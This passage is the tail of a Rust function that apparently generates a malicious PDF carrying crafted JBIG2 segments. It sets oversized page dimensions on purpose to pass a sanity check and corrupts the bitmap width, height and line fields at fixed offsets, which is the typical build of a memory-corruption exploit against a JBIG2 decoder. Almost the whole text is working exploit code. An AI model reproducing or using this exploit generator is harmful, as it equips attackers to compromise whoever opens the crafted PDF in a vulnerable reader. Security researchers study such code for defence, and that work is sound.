    let mut pad = Vec::new();
    let sz = (ref_seg_bytes.len() + 9) >> 3;
    for _i in 0..sz { pad.push(0); }
    // pad.extend_from_slice(&[0x00u8; sz]);
    let mut refs = Vec::new();
    refs.extend(pad);
    refs.extend(&ref_seg_bytes);

    let data = trs.get_data()?;
    let mut sds_sh = JBIG2Segment::new(5, 0x4, (0xE0000000 + ref_seg_bytes.len()) as u32, 1, data.len());
    sds_sh.set_refs(refs);
    main_stream.write_all(&sds_sh.get_data()?)?;
    main_stream.write_all(&data)?;

    // fail a sanity check but set pageW and pageH to large values so subsequent reads will work 
    let pis = JBIG2PageInfoSegment::new(0xffffffff, 0xfffffffe, 0, 0, 0, 0);
    let data = pis.get_data()?;
    let sds_sh = JBIG2Segment::new(0xffffffff, 0x30, 0, 1, data.len());
    main_stream.write_all(&sds_sh.get_data()?)?;
    main_stream.write_all(&data)?;

    or_808080h_at_offset_h(&mut main_stream, DATA_BUFFER_TO_BITMAP_W)?;

	or_bytes_at_offset_w(&mut main_stream, 0x7fffffff, DATA_BUFFER_TO_BITMAP_W)?;
	or_bytes_at_offset_w(&mut main_stream, 0x7fffffff, DATA_BUFFER_TO_BITMAP_H)?;
	or_bytes_at_offset_w(&mut main_stream, 0xFFFFFFFF, DATA_BUFFER_TO_BITMAP_LINE)?;

    write_dbg_header(&mut main_stream)?;

    create_pdf(path, &global_stream, &main_stream)?;

    Ok(())
}